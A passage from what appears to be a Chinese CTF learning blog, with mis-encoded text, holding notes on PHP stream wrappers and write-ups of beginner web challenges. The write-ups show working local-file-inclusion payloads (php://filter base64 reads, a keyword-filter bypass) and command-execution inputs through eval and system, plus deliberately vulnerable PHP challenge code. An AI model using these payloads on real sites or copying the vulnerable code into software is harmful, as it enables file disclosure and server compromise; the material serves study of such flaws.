ï¼Œä½¿ç”¨php://inputæ¥æ‰§è¡ŒPHPä»£ç ã€‚<br>php://input:å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTä¸­çš„data<br>php://output:å…è®¸ä»¥printå’Œechoä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒº<br>php://fd:å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦<br>php://memory   php://temp:æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚<br>php://filter:ä¸€ç§åŸå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚       </p><blockquote><p>ç›¸å…³å‚æ•°ï¼š<br>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;<br>read=&lt;è¯»é“¾çš„è¿‡æ»¤å™¨&gt;<br>write=&lt;å†™é“¾çš„è¿‡æ»¤å™¨&gt;<br>&lt;;ä¸¤ä¸ªé“¾çš„è¿‡æ»¤å™¨&gt;ä»»ä½•æ²¡æœ‰ä»¥read=æˆ–write=åšå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾     </p><blockquote><p>å­—ç¬¦ä¸²è¿‡æ»¤å™¨<br>string.rot13:rot13å˜æ¢<br>string.toupper:è½¬å¤§å†™å­—æ¯<br>string.tolower:è½¬å°å†™å­—æ¯<br>string.strip_tags:å»é™¤htmlã€phpè¯­è¨€æ ‡ç­¾<br>è½¬æ¢è¿‡æ»¤å™¨<br>conver.base64-encode&amp;convert.base64-decode:base64ç¼–ç è§£ç <br>convert.quoted-printable-encode&amp;canvert.quoted-printable-decode:quoted-printableå­—ç¬¦ä¸²ä¸8-bitå­—ç¬¦ä¸²ç¼–ç è§£ç <br>è¿˜ç”¨å‹ç¼©è¿‡æ»¤å™¨å’ŒåŠ å¯†è¿‡æ»¤å™¨ï¼Œæ„Ÿè§‰ç”¨ä¸åˆ°ï¼Œä»¥åè§åˆ°ç›¸å…³é¢˜å†å†™å§<br>ä¼ªåè®®é¢˜å¸¸ç”¨çš„ä¸¤å¥è¯ï¼šphp://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]<br>php://input+[POST DATA]æ‰§è¡ŒPHPä»£ç       </p></blockquote></blockquote></blockquote></li></ul><hr><blockquote><p>zip://&amp;bzip://&amp;zlib://åè®®<br>ä½œç”¨ï¼šä»–ä»¬éƒ½æ˜¯å‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶</p></blockquote><hr><p>æ„Ÿè§‰ä¸€å †æ–‡å­—å¥½å¯æ€•å•Šï¼Œç­‰æŠŠPHPå¼„å¥½åï¼Œè‡ªå·±èƒ½å®ç°è¿™äº›åè®®åå†å®Œå–„å§~~~</p>]]></content>
    
    
    <categories>
      
      <category>NOTE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NOTE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugkuåˆ·é¢˜è®°å½•</title>
    <link href="/2020/12/04/bugku/"/>
    <url>/2020/12/04/bugku/</url>
    
    <content type="html"><![CDATA[<h1 id="bugkuâ€“wp"><a href="#bugkuâ€“wp" class="headerlink" title="bugkuâ€“wp"></a>bugkuâ€“wp</h1><hr><h2 id="1-web2"><a href="#1-web2" class="headerlink" title="1.web2"></a>1.web2</h2><p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼ŒF12æŸ¥çœ‹æºç çš„åˆ°flagã€‚ </p><hr><h2 id="2-è®¡ç®—å™¨"><a href="#2-è®¡ç®—å™¨" class="headerlink" title="2.è®¡ç®—å™¨"></a>2.è®¡ç®—å™¨</h2><p>æ•°å­¦é¢˜è®¡ç®—ï¼Œè¾“å…¥ç»“æœå‘ç°åªèƒ½è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œåº”è¯¥æ˜¯é™åˆ¶äº†é•¿åº¦ï¼Œä¿®æ”¹æºç åé‡æ–°æäº¤ï¼Œå¾—åˆ°flagã€‚         </p><hr><h2 id="3-webåŸºç¡€-GET"><a href="#3-webåŸºç¡€-GET" class="headerlink" title="3.webåŸºç¡€$_GET"></a>3.webåŸºç¡€$_GET</h2><p>URLä¸­è¾“å…¥what=flagå¾—åˆ°flagã€‚        </p><hr><h2 id="4-webåŸºç¡€-amp-POST"><a href="#4-webåŸºç¡€-amp-POST" class="headerlink" title="4.webåŸºç¡€&amp;_POST"></a>4.webåŸºç¡€&amp;_POST</h2><p>ç”¨hackbaræäº¤what=flagå¾—åˆ°flagã€‚   </p><hr><h2 id="5-çŸ›ç›¾"><a href="#5-çŸ›ç›¾" class="headerlink" title="5.çŸ›ç›¾"></a>5.çŸ›ç›¾</h2><p><img src="https://ftp.bmp.ovh/imgs/2020/12/47c19a360df3b2fc.png"><br>is_numeric() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚<br>é¢˜ç›®çš„æ„æ€æ˜¯$numçš„å€¼ä¸º1ï¼Œä½†ä¸æ˜¯æ•°å­—ï¼ŒPHPæ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œ==è¿›è¡Œè½¬æ¢æ—¶ä¼šæŠŠå­—ç¬¦ä¸²è½¬æ¢æˆç¬¬ä¸€ä½ï¼Œæ‰€ä»¥ä¼ å…¥num=1aaï¼Œå¾—åˆ°flagã€‚  </p><hr><h2 id="6-web3"><a href="#6-web3" class="headerlink" title="6.web3"></a>6.web3</h2><p><img src="https://ftp.bmp.ovh/imgs/2020/12/3e9fed55d2d084fd.png"><br>ä¸çŸ¥é“è¯¥æ€ä¹ˆåŠï¼ŒF12å‘ç°å•¥ä¹Ÿæ²¡æœ‰ï¼Œå°†é˜»æ­¢é¡µé¢åˆ›å»ºå¯¹è¯æ¡†å‹¾é€‰ä¸Šï¼Œå†æ¬¡F12å¾—åˆ°ä¸€ä¸²Unicodeç¼–ç ï¼Œè§£ç å¾—åˆ°flagã€‚       </p><hr><h2 id="7-åŸŸåè§£æ"><a href="#7-åŸŸåè§£æ" class="headerlink" title="7.åŸŸåè§£æ"></a>7.åŸŸåè§£æ</h2><p><img src="https://ftp.bmp.ovh/imgs/2020/12/39ef3bd33297fc5c.png"><br>ä¸çŸ¥é“å•¥æ˜¯åŸŸåè§£æï¼Œç½‘ä¸Šæœäº†ä¸€å¤§å †éƒ½æ˜¯ä¹°åŸŸåä»€ä¹ˆçš„ï¼Œè¿˜æ˜¯ç›´æ¥å»çœ‹åˆ«äººçš„wpå§ã€‚<br>å°†C:\Windows\System32\drivers\etcè¿™ä¸ªè·¯å¾„ä¸‹çš„hostsæ–‡ä»¶æœ«å°¾åŠ ä¸Š 123.206.87.240 flag.baidu.com ç„¶åæµè§ˆå™¨æ‰“flag.baidu.com<br>å°±èƒ½çœ‹åˆ°flagäº†ã€‚<br>å…³äºåŸŸåè§£æï¼šåŸŸåè§£ææ˜¯æŠŠåŸŸåæŒ‡å‘ç½‘ç«™ç©ºé—´IPï¼Œè®©äººä»¬é€šè¿‡æ³¨å†Œçš„åŸŸåå¯ä»¥æ–¹ä¾¿åœ°è®¿é—®åˆ°ç½‘ç«™çš„ä¸€ç§æœåŠ¡ã€‚IPåœ°å€æ˜¯ç½‘ç»œä¸Šæ ‡è¯†ç«™ç‚¹çš„æ•°å­—åœ°å€ï¼Œä¸ºäº†æ–¹ä¾¿è®°å¿†ï¼Œé‡‡ç”¨åŸŸåæ¥ä»£æ›¿IPåœ°å€æ ‡è¯†ç«™ç‚¹åœ°å€ã€‚åŸŸåè§£æå°±æ˜¯åŸŸååˆ°IPåœ°å€çš„è½¬æ¢è¿‡ç¨‹ã€‚åŸŸåçš„è§£æå·¥ä½œç”±DNSæœåŠ¡å™¨å®Œæˆã€‚      </p><p>Windowsä¸­hostsæ–‡ä»¶çš„ä½œç”¨ï¼šå°†ä¸€äº›å¸¸ç”¨çš„ç½‘å€åŸŸåä¸å…¶å¯¹åº”çš„IPåœ°å€å»ºç«‹ä¸€ä¸ªå…³è”â€œæ•°æ®åº“â€ï¼Œå½“ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç½‘å€æ—¶ï¼Œç³»ç»Ÿä¼šé¦–å…ˆè‡ªåŠ¨ä»Hostsæ–‡ä»¶ä¸­å¯»æ‰¾å¯¹åº”çš„IPåœ°å€ï¼Œä¸€æ—¦æ‰¾åˆ°ï¼Œç³»ç»Ÿä¼šç«‹å³æ‰“å¼€å¯¹åº”ç½‘é¡µï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ç³»ç»Ÿä¼šå†å°†ç½‘å€æäº¤DNSåŸŸåè§£ææœåŠ¡å™¨è¿›è¡ŒIPåœ°å€çš„è§£æã€‚       </p><p>å¯¹äºhostsæ–‡ä»¶çš„ä¿®æ”¹ä¼šå‡ºç°ctrl+såä¼šä¿å­˜ä¸ºå¦ä¸€ä¸ªæ–‡ä»¶ï¼Œè§£å†³åŠæ³•ï¼š<br>è¿›å…¥hostsçš„ç›®å½•åï¼š<img src="https://ftp.bmp.ovh/imgs/2020/12/081b9deac349513a.png"><br>è¾“å…¥cmdï¼Œè¿›å…¥ç®¡ç†å‘˜ç®¡ç†ç•Œé¢ï¼Œå†è¾“å…¥notepad hostsï¼Œå›è½¦åå¼¹å‡ºhostsæ–‡ä»¶ï¼Œä¿®æ”¹åCTRL+sä¿å­˜å³å¯ã€‚</p><hr><h2 id="8-ä½ å¿…é¡»è®©ä»–åœä¸‹æ¥"><a href="#8-ä½ å¿…é¡»è®©ä»–åœä¸‹æ¥" class="headerlink" title="8.ä½ å¿…é¡»è®©ä»–åœä¸‹æ¥"></a>8.ä½ å¿…é¡»è®©ä»–åœä¸‹æ¥</h2><p>æ‰“å¼€é¢˜ç›®åœ°å€åå‘ç°ä¸€ç›´åœ¨åˆ·æ–°ï¼ŒF12æŸ¥çœ‹æºä»£ç åå‘ç°æ¯æ¬¡åˆ·æ–°éƒ½ä¼šæ˜¯ä¸åŒçš„å›¾ç‰‡ï¼ŒburpæŠ“åŒ…çœ‹çœ‹å§ï¼Œä¸æ–­sendåå¾—åˆ°flag<br> <img src="https://ftp.bmp.ovh/imgs/2020/12/beefc7458013777d.png">          </p><hr><h2 id="9-æœ¬åœ°åŒ…å«"><a href="#9-æœ¬åœ°åŒ…å«" class="headerlink" title="9.æœ¬åœ°åŒ…å«"></a>9.æœ¬åœ°åŒ…å«</h2><p>è¿™é“é¢˜çš„ç½‘ç«™å¥½åƒåäº†ï¼Œæ‰“å¼€åä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼ŒæŠ“åŒ…ï¼Œå¾¡å‰‘éƒ½è¯•äº†ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œçœ‹åˆ«äººä»¥å‰çš„WPæ˜¯æœ‰ä¸€æ®µPHPä»£ç çš„ã€‚ </p><hr><h2 id="10-å˜é‡1"><a href="#10-å˜é‡1" class="headerlink" title="10.å˜é‡1"></a>10.å˜é‡1</h2><p>é¦–å…ˆä»£ç å®¡è®¡               </p><pre><code><pre><code class="hljs php">flag In the variable !     <span class="hljs-comment">////flagåœ¨ä¸€ä¸ªå˜é‡ä¸­</span><span class="hljs-meta">&lt;?php</span>      error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;highlight_file(<span class="hljs-keyword">__file__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;   $args = $_GET[<span class="hljs-string">&#x27;args&#x27;</span>];   <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,$args))&#123;     <span class="hljs-comment">////æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ„æ€æ˜¯å¦‚æœå­—ç¬¦ä¸²ä¸æ˜¯å…¨éƒ¨ç”±å­—æ¯ï¼ˆåŒ…å«å¤§å°å†™ï¼‰ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ç»„æˆçš„ï¼Œå°±ä¼šè¾“å‡º args error!</span>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);   &#125;   <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);         <span class="hljs-comment">////$$argså¯å˜å˜é‡ï¼Œå°†$argsä½œä¸ºå˜é‡ã€‚</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>æ‰€ä»¥ä»€ä¹ˆèƒ½å¤Ÿå°†å˜é‡æ˜¾ç¤ºå‡ºæ¥å‘¢ï¼Œç­”æ¡ˆæ˜¯å…¨å±€å˜é‡ GLOBALS<br>$GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡<br>è¾“å…¥ args=GLOBALS å¾—åˆ°flagã€‚<br><img src="https://ftp.bmp.ovh/imgs/2020/12/136889d8f52006b5.png"></p><h4 id="çŸ¥è¯†ç‚¹æ€»ç»“"><a href="#çŸ¥è¯†ç‚¹æ€»ç»“" class="headerlink" title="çŸ¥è¯†ç‚¹æ€»ç»“"></a>çŸ¥è¯†ç‚¹æ€»ç»“</h4><ul><li>é¦–å…ˆæ˜¯preg_matché‚£ä¸€æ®µï¼Œæ³¨æ„è¿˜æœ‰ä¸ª ï¼ ï¼Œ       </li><li>ä¸¤ä¸ª//è¡¨ç¤ºå¼€å§‹å’Œç»“æŸï¼Œ</li><li>^è¡¨ç¤ºå¼€å§‹å­—ç¬¦ä¸²ï¼Œ</li><li>$è¡¨ç¤ºç»“æŸå­—ç¬¦ä¸²ï¼Œ</li><li>\wè¡¨ç¤ºåŒ…å«ã€a-zï¼ŒA-Z, _ , 0-9ã€‘ï¼Œ</li><li>+è¡¨ç¤ºä¸€ä¸ªæˆ–è€…å¤šä¸ª\wã€‚</li><li>æ³¨æ„æ˜¯å­—ç¬¦ä¸² å…¨éƒ¨ ã€a-zï¼ŒA-Z, _ , 0-9ã€‘è¿™äº›ç»„æˆæ‰trueã€‚        </li><li>è¿˜æœ‰å°±æ˜¯é‚£ä¸ªå¸¦ä¸¤ä¸ªç¾å…ƒç¬¦å·çš„å¯å˜å˜é‡ã€‚</li><li>å…¨å±€å˜é‡ï¼š</li><li>$GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ã€‚</li><li>$_SERVER è¿™ç§è¶…å…¨å±€å˜é‡ä¿å­˜å…³äºæŠ¥å¤´ã€è·¯å¾„å’Œè„šæœ¬ä½ç½®çš„ä¿¡æ¯ã€‚</li><li>REQUEST\GET\POSTä¹Ÿéƒ½æ˜¯å…¨å±€å˜é‡ã€‚            </li><li><hr><h2 id="11-web5"><a href="#11-web5" class="headerlink" title="11.web5"></a>11.web5</h2><img src="https://ftp.bmp.ovh/imgs/2020/12/5b59308e8f0baff2.png"><br>F12åçœ‹åˆ°ä¸€å †å¥‡æ€ªçš„ç¬¦å·ï¼Œæ ¹æ®é¢˜ç›®æç¤ºåº”è¯¥æ˜¯ JSPFUCK ç¼–ç ï¼›è§£ç æ–¹æ³•ï¼šå°†å…¶å¤åˆ¶ç²˜è´´åˆ°æ§åˆ¶å°åå›è½¦ï¼Œå¾—åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2020/12/4341596e2726364f.png"><br>æ³¨æ„é¢˜ç›®è¦æ±‚ï¼Œæäº¤æ—¶å­—æ¯å¤§å†™ï¼ï¼<br>jjencodeã€aaencodeè¿™ä¸¤ä¸ªä¹Ÿå¯ä»¥ç”¨æ­¤æ–¹æ³•è§£ç ã€‚<br>jjencode:<img src="https://ftp.bmp.ovh/imgs/2020/12/4c6f2b82c79f2d09.png"><br>aaencode:<img src="https://ftp.bmp.ovh/imgs/2020/12/8331e5413d3b5f56.png"></li></ul><hr><h2 id="12-å¤´ç­‰èˆ±"><a href="#12-å¤´ç­‰èˆ±" class="headerlink" title="12.å¤´ç­‰èˆ±"></a>12.å¤´ç­‰èˆ±</h2><p>æ‰“å¼€åœ°å€åï¼Œé¡µé¢ä¸Šå†™æœ‰ä»€ä¹ˆä¹Ÿæ²¡æœ‰å‡ ä¸ªå­—ï¼Œä¸çŸ¥é“å•¥æ„æ€ï¼Œå¾¡å‰‘ï¼Œburpä¸€èµ·ä¸Šï¼Œå‘ç°sendåå¾—åˆ°flagã€‚<br> <img src="https://ftp.bmp.ovh/imgs/2020/12/1b08738f709f6956.png"></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¼ªåè®®--WP</title>
    <link href="/2020/12/03/wxyWP/"/>
    <url>/2020/12/03/wxyWP/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¼ªåè®®1"><a href="#ä¼ªåè®®1" class="headerlink" title="ä¼ªåè®®1"></a>ä¼ªåè®®1</h2><p>é¢˜ç›®ï¼š</p><pre><code>                    é’ˆä¸æˆ³ï¼ŒåƒæŸ æª¬çš„æ„Ÿè§‰é’ˆä¸æˆ³    &lt;?php    error_reporting(0);    echo &#39;&lt;center&gt;&lt;strong&gt;é’ˆä¸æˆ³ï¼ŒåƒæŸ æª¬çš„æ„Ÿè§‰é’ˆä¸æˆ³&lt;/strong&gt;&lt;/center&gt;&#39;;    highlight_file(__FILE__);    $file=$_GET[&#39;file&#39;];    if (isset($file))&#123;        if(preg_match(&#39;/php|file|zip|bzip|zlib|base|data/&#39;,$file))&#123;            echo (&#39;hacker!!!&#39;);        &#125;else &#123;            include $file;          ////include è¯­å¥åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚        &#125;    &#125;    #ä¸å¯¹åŠ²ï¼Œæ€»æ„Ÿè§‰å†™é”™äº†å•¥ï¼Œç®—äº†ï¼Œå…ˆå»åƒæŸ æª¬~    ?&gt; </code></pre><p>è¿™æ¬¡çš„é¢˜ç›®å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸ª<code>preg_match</code>å‡½æ•°ä¸­æ²¡æœ‰ <strong>i</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ­£åˆ™åŒ¹é…æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥å°†æ¶‰åŠåˆ°çš„è¿‡æ»¤çš„è¯æ¢æˆå¤§å†™å³å¯ã€‚<br>æ ¹æ®é¢˜ç›®ï¼Œæˆ–è€…æ ¹æ®  <code>include $file</code> åˆ¤æ–­è¿™æ˜¯ä¸€é“ä¼ªåè®®é¢˜ï¼Œurlä¸­è¾“å…¥<code> ?file=Php://filter/read=convert.Base64-encode/resource=flag.php</code> ,ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼ŒæŠŠ<code>.php</code>åˆ äº†ï¼Œå›è½¦å¾—åˆ°ä¸€æ®µbase64ç¼–ç ï¼š<br><img src="https://ftp.bmp.ovh/imgs/2020/12/eb3a088303494cf6.png"></p><p>è§£ç åå¾—åˆ°flagï¼š<br><img src="https://ftp.bmp.ovh/imgs/2020/12/34b02328261e3877.png"><br>è¿™é‡Œçš„flagåŒ…å«åœ¨flagæ–‡ä»¶é‡Œæˆ‘æ˜¯çŒœçš„ï¼Œä½†å¼„äº†å¥½ä¸€ä¼šå„¿è¿˜æ˜¯ä¸çŸ¥é“æ€ä¹ˆçŸ¥é“flagåŒ…å«åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼Œé—®äº†å¾ç¥åè¯´ï¼Œè¿™å°±æ˜¯çŒœçš„Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·<br>å¥½å§ï¼Œçœ‹æ¥è¿˜æ˜¯æˆ‘åšé¢˜çš„ç»éªŒä¸å¤Ÿå•Šã€‚<br>è‡³äºä¸ºä»€ä¹ˆflagæ–‡ä»¶æ²¡æœ‰åç¼€ï¼Œå› ä¸ºLinuxä¸­æ–‡ä»¶å¯ä»¥æ²¡æœ‰æ‰©å±•åï¼Œå‡ºé¢˜åº”è¯¥å°±æ˜¯åœ¨Linuxä¸‹å‡ºçš„å§ã€‚          </p><hr><h2 id="ä¼ªåè®®2"><a href="#ä¼ªåè®®2" class="headerlink" title="ä¼ªåè®®2"></a>ä¼ªåè®®2</h2><p>é¢˜ç›®ï¼š</p><pre><code>                é’ˆä¸æˆ³ï¼ŒåƒæŸ æª¬çš„æ„Ÿè§‰é’ˆä¸æˆ³    &lt;?php    error_reporting(0);    echo &#39;&lt;center&gt;&lt;strong&gt;é’ˆä¸æˆ³ï¼ŒåƒæŸ æª¬çš„æ„Ÿè§‰é’ˆä¸æˆ³&lt;/strong&gt;&lt;/center&gt;&#39;;    highlight_file(__FILE__);    $file=$_GET[&#39;file&#39;];    if (isset($file))&#123;        if(preg_match(&#39;/php|file|zip|bzip|zlib|base|data/i&#39;,$file))&#123;            echo (&#39;hacker!!!&#39;);        &#125;else &#123;            $a=str_replace(&quot;troye&quot;,&quot;&quot;,$file);       ////str_replaceæ›¿æ¢å‡½æ•°ï¼Œæ„æ€æ˜¯å°†$fileä¸­çš„troyeæ›¿æ¢æ²¡æœ‰ã€‚            include $a;        &#125;    &#125;    #ä¸å¯¹åŠ²ï¼Œæ€»æ„Ÿè§‰å†™é”™äº†å•¥ï¼Œç®—äº†,ç»§ç»­åƒæŸ æª¬~    ?&gt; </code></pre><p>è¿™ä¸€æ¬¡<code>preg_match</code>å‡½æ•°ä¸­åŠ ä¸Šäº†<strong>i</strong>ï¼ŒåŒºåˆ†å¤§å°å†™äº†ï¼Œä½†ä¸‹é¢çš„<code>str_replace</code>å‡½æ•°æä¾›äº†å¦ä¸€ç§ç»•è¿‡æ–¹å¼ï¼Œæ‰€ä»¥å¯ä»¥å°†<code>preg_match</code>è¿‡æ»¤çš„è¯ä¸­æ’å…¥troyeä¾¿å¯ç»•è¿‡è¾“å…¥<code>?file=ptroyehp://filter/read=convert.btroyease64-encode/resource=flag</code>å¾—åˆ°base64ç¼–ç ï¼š<img src="https://ftp.bmp.ovh/imgs/2020/12/2cf1778026b759e0.png"><br>è§£ç åå¾—åˆ°flagï¼š<br><img src="https://ftp.bmp.ovh/imgs/2020/12/579dbc421b42e0a4.png">        </p><hr><h2 id="çŸ¥è¯†ç‚¹æ€»ç»“"><a href="#çŸ¥è¯†ç‚¹æ€»ç»“" class="headerlink" title="çŸ¥è¯†ç‚¹æ€»ç»“"></a>çŸ¥è¯†ç‚¹æ€»ç»“</h2><blockquote><p><code>include</code>å‡½æ•°ï¼šåŒ…å«å¹¶å¯¹ç»™å®šçš„æ–‡ä»¶è¿›è¡Œè®¡ç®—ã€‚<br><code>str_replace</code>å‡½æ•°ï¼šæ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚è€Œ <code>str_ireplace() </code>å‡½æ•°æ‰§è¡Œä¸åŒºåˆ†å¤§å°å†™çš„æœç´¢ã€‚<br>CTFä¼ªåè®®å¸¸ç”¨çš„ä¸¤å¥è¯ï¼š<br><code>php://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]</code>è¯»å–æ–‡ä»¶æºç <br><code>php://input+[POST DATA]</code>  æ‰§è¡ŒPHPä»£ç </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basic Rce---WP</title>
    <link href="/2020/11/28/RCEWP/"/>
    <url>/2020/11/28/RCEWP/</url>
    
    <content type="html"><![CDATA[<h1 id="basic-rce1â€”â€”wp"><a href="#basic-rce1â€”â€”wp" class="headerlink" title="basic rce1â€”â€”wp"></a>basic rce1â€”â€”wp</h1><p>é¦–å…ˆè¿›è¡Œä»£ç å®¡è®¡ï¼š</p><pre><code>&lt;?php//æ‹¿åˆ°flagå°±ä¸è¦ä¹±ç©äº†å“¦~error_reporting(0);     //phpå‡½æ•°ï¼Œå…³é—­é”™è¯¯æŠ¥å‘Šshow_source(__FILE__);   //è¯¥å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºï¼Œåº”è¯¥å°±æ˜¯è®©PHPä»£ç èƒ½å¤Ÿåœ¨HTMLé¡µé¢ä¸Šæ˜¾ç¤ºã€‚eval($_GET[&#39;a&#39;]);   //é¦–å…ˆï¼Œeval()å‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸²æŒ‰ç…§PHPä»£ç æ¥è®¡ç®—ï¼Œè¯¥å­—ç¬¦ä¸²å¿…é¡»æ˜¯åˆæ³•çš„PHPä»£ç ï¼Œå³ä»¥åˆ†å·ç»“å°¾ï¼›æ‹¬å·é‡Œå°±æ˜¯ä»¥GETçš„æ–¹å¼è¾“å…¥a.?&gt;    </code></pre><p>æ•´ä¸ªé¢˜ç›®å°±æ˜¯è¿™æ ·äº†ï¼Œä½†æ˜¯ä¸€ç‚¹flagçš„å½±å­éƒ½æ²¡æœ‰ï¼Œç»“åˆeval()å‡½æ•°ï¼ŒçŒœæƒ³åº”è¯¥æ˜¯é€šè¿‡ä¸€æ®µä»£ç å°†flagæ˜¾ç¤ºå‡ºæ¥ï¼Œæ‰€ä»¥é¦–å…ˆåº”è¯¥è¦çŸ¥é“åŒ…å«flagçš„æ–‡ä»¶åï¼Œsystem()å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<br>system(â€˜lsâ€™)ä¸€ä¸‹ï¼Œæ³¨æ„ï¼šä¸è¦å¿˜è®°å•å¼•å·ï¼ï¼ï¼ï¼ï¼<br><img src="https://ftp.bmp.ovh/imgs/2020/11/d7d0a05f4b5bb4e7.png"><br>çŸ¥é“äº†æ–‡ä»¶åf111a9.phpï¼Œæ¥ä¸‹æ¥å°±ç”¨å‘½ä»¤æ‰“å¼€å®ƒï¼Œæ‰“å¼€æ–‡ä»¶çš„å‘½ä»¤æœ‰ï¼š<br><img src="https://ftp.bmp.ovh/imgs/2020/11/f86c87a349a74379.png"><br>é€ä¸ªè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°åªæœ‰ tac å¯ä»¥å¾—åˆ°flagï¼š<br><img src="https://ftp.bmp.ovh/imgs/2020/11/1c5262a8578d0993.png">          </p><hr><h2 id="çŸ¥è¯†ç‚¹æ€»ç»“"><a href="#çŸ¥è¯†ç‚¹æ€»ç»“" class="headerlink" title="çŸ¥è¯†ç‚¹æ€»ç»“"></a>çŸ¥è¯†ç‚¹æ€»ç»“</h2><ul><li>eval()å‡½æ•°ï¼šå°†å­—ç¬¦ä¸²æŒ‰ç…§ä»£ç è®¡ç®—ã€‚ï¼ˆä»£ç æ‰§è¡Œï¼‰ï¼ˆä¸€å¥è¯æœ¨é©¬ï¼‰</li><li>system()å‡½æ•°ï¼šå‘½ä»¤æ‰§è¡Œã€‚    <h2 id="ä¸€äº›æƒ³æ³•"><a href="#ä¸€äº›æƒ³æ³•" class="headerlink" title="ä¸€äº›æƒ³æ³•"></a>ä¸€äº›æƒ³æ³•</h2></li><li>ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œçš„åŒºåˆ«ï¼šä»£ç æ‰§è¡Œå®é™…ä¸Šå°±æ˜¯è°ƒç”¨æœåŠ¡å™¨ç½‘ç«™ä»£ç è¿›è¡Œæ‰§è¡Œï¼›è€Œå‘½ä»¤æ‰§è¡Œæ˜¯é€šè¿‡æ˜“å—æ”»å‡»çš„åº”ç”¨åœ¨ä¸»æœºä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚<pre><code>* å¦‚ï¼š       &lt;?php         </code></pre>  eval(â€œecho 1+1;â€);    //2<br>  system(â€œecho 1+1;â€);  //1+1;               <pre><code>?&gt;</code></pre></li></ul><p>è™½ç„¶è¿˜æ˜¯æœ‰ç‚¹ä¸å¤ªç†è§£ï¼Œç­‰ä»¥åæ·±å…¥å­¦ä¹ åº”è¯¥å°±æ‡‚äº†å§ã€‚      </p><ul><li><p>ä¸ºä»€ä¹ˆåªæœ‰ tac å¯ä»¥å¾—åˆ°flag    </p><ul><li> çŒœæƒ³ï¼šæ–‡ä»¶ä¸­æœ‰ç©ºè¡Œï¼Œå› ä¸ºæ‰§è¡Œsystem(â€˜cat -n f111a9.phpâ€™);å‘½ä»¤åè¾“å‡º 1 4 ï¼Œè¡¨ç¤ºåªæœ‰ä¸€å››è¡Œæœ‰è¾“å‡ºå†…å®¹ã€‚å…¶ä»–çš„å°±ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¾—ä¸åˆ°äº†ã€‚       </li></ul></li><li><hr><h1 id="basic-rce2â€”â€”wp"><a href="#basic-rce2â€”â€”wp" class="headerlink" title="basic rce2â€”â€”wp"></a>basic rce2â€”â€”wp</h1><p>ä»£ç 